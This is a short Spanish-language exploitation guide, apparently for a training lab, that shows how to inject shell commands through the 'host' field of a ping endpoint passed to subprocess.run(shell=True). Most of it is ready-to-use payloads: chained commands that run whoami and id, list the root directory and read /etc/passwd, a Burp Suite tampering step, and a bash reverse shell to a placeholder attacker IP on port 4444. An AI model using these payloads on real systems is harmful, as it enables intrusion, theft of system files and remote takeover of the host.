Pasos de explotación

  1. El campo host se pasa directamente a subprocess.run(shell=True) sin sanitización.
  2. Usa separadores de comandos para inyectar comandos adicionales:
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
127.0.0.1; ls -la /
127.0.0.1; cat /etc/hostname
  1. Con Burp Suite: intercepta el POST a /cmdi/ping y modifica el campo host.
  2. Prueba a obtener una reverse shell: 127.0.0.1; bash -i >& /dev/tcp/TU_IP/4444 0>&1
